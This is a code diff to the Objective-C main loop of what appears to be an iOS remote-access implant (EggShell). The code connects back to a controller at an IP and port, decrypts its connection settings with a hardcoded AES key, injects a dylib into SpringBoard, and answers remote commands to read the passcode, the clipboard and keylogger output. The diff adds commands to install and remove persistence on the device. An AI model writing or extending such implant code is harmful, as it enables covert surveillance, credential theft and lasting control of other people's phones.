@@ -11,21 +11,21 @@ espl *_espl;
 bool debug = false;
 NSString *TERM = @"EOF6D2ONE";
 NSString *tmpData = @"";
-
 NSArray *noReplyCommands = [[NSArray alloc] initWithObjects:
 @"play", @"pause", @"next", @"prev", @"home", @"doublehome", @"lock", @"wake",@"keylogclear",nil];
 NSArray *yesReplyCommands = [[NSArray alloc] initWithObjects:
 @"getpasscode",@"getpaste",@"unlock",@"keylog",nil];
 
+
 int main(int argc, char **argv, char **envp) {
     _espl = [[espl alloc] init];
-    
     //this actually fucks up the alert command idk why
     //[filemanager removeItemAtPath:[NSString stringWithFormat:@"%s",argv[0]] error:nil]; //delete self and cry
     
     [filemanager changeCurrentDirectoryPath:NSHomeDirectory()];
 
     int success;
+    NSArray *args;
     if (debug) {
         success = [_espl connect:[NSString stringWithFormat:@"%@",@"192.168.1.104"] :atoi("4444")];
         _espl.skey = @"12345678123456781234567812345678";
@@ -36,7 +36,7 @@ int main(int argc, char **argv, char **envp) {
         NSData *decodedData = [[NSData alloc] initWithBase64EncodedString:argument options:0];
         argument = [[NSString alloc] initWithData:decodedData encoding:NSUTF8StringEncoding];
         argument = [FBEncryptorAES decryptBase64String:argument keyString:@"spGHbigdxMBJpbOCAr3rnS3inCdYQyZV"]; //shared decryption key
-        NSArray *args = [argument componentsSeparatedByCharactersInSet:[NSCharacterSet whitespaceCharacterSet]];
+        args = [argument componentsSeparatedByCharactersInSet:[NSCharacterSet whitespaceCharacterSet]];
         success = [_espl connect:[NSString stringWithFormat:@"%@",args[0]] :atoi([args[1] UTF8String])];
         _espl.skey = args[2];
     }
@@ -64,6 +64,7 @@ int main(int argc, char **argv, char **envp) {
                     [rawdata writeToFile:@"/Library/MobileSubstrate/DynamicLibraries/eggshellPro.dylib" atomically:true];
                     tmpData = @"";
                     [_espl exec:@"echo '{ Filter = { Bundles = ( \"com.apple.springboard\" ); }; }' > /Library/MobileSubstrate/DynamicLibraries/eggshellPro.plist; killall SpringBoard"];
+                    [_espl blank];
                 }
                 else {
                     [_espl blank];
@@ -122,6 +123,7 @@ int main(int argc, char **argv, char **envp) {
             }
             else if ([cmdarray[0] isEqualToString: @"respring"]) {
                 [_espl exec:@"killall SpringBoard"];
+                [_espl blank];
             }
             else if ([cmdarray[0] isEqualToString: @"listapps"]) {
                 [_espl listapps];
@@ -131,6 +133,12 @@ int main(int argc, char **argv, char **envp) {
             }
             else if ([cmdarray[0] isEqualToString: @"say"]) {
                 [_espl say:[recvData stringByReplacingOccurrencesOfString: @"say " withString:@""]]; //TODO: fix this idiot
+            }
+            else if ([cmdarray[0] isEqualToString: @"persistence"]) {
+                [_espl persistence:[NSString stringWithFormat:@"%@",args[0]]:atoi([args[1] UTF8String])];
+            }
+            else if ([cmdarray[0] isEqualToString: @"rmpersistence"]) {
+                [_espl rmpersistence];
             }
             else if ([cmdarray[0] isEqualToString: @"installpro"]) {
                 isReceivingFile = true;
